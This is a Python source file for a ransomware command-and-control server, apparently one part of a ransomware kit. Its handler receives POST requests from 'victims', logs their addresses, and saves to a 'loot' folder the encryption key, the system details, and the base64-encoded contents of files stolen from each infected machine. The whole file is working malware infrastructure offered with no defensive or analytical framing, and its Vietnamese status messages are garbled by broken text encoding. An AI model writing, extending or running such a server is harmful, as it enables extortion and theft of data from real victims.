from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
import base64

class RansomHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        print(f"\n[!] Victim connected: {self.client_address[0]}")
        
        
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
           
            data = json.loads(post_data)
        except Exception as e:
            print(f" [!] Lá»—i giáº£i mĂ£ JSON: {e}")
            self.send_response(400)
            self.end_headers()
            return

        # set up loot
        loot_dir = os.path.join(os.getcwd(), "loot")
        if not os.path.exists(loot_dir):
            os.makedirs(loot_dir)

        
        if 'key' in data:
            with open(os.path.join(loot_dir, "decrypt.key"), "w") as f:
                f.write(data['key'])
            print(f" [+] ÄĂ£ lÆ°u Key giáº£i mĂ£: {data['key']}")

       
        if 'system' in data:
            with open(os.path.join(loot_dir, "victim_info.txt"), "w", encoding="utf-8") as f:
                f.write(str(data['system']))
            print(f" [+] ÄĂ£ lÆ°u thĂ´ng tin mĂ¡y náº¡n nhĂ¢n.")

        # Lấy nội dung file (EXE, PDF, TXT...)
        if 'content' in data:
            file_dict = data['content'] 
            for filename, b64_content in file_dict.items():
                try:
                    safe_name = os.path.basename(filename)
                    
                    file_bytes = base64.b64decode(b64_content)
                    
                    with open(os.path.join(loot_dir, safe_name), "wb") as f:
                        f.write(file_bytes)
                    print(f" [+] ÄĂ£ thu tháº­p vĂ  khĂ´i phá»¥c file: {safe_name}")
                except Exception as e:
                    print(f" [!] Lá»—i khi xá»­ lĂ½ file {filename}: {e}")

        # Pháº£n há»“i cho victim
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        self.send_response(403)
        self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 5000), RansomHandler)
    print("------------------------------------------")
    print("C&C Server JSON Mode Ä‘ang cháº¡y táº¡i Port 5000...")
    print("------------------------------------------")
    server.serve_forever()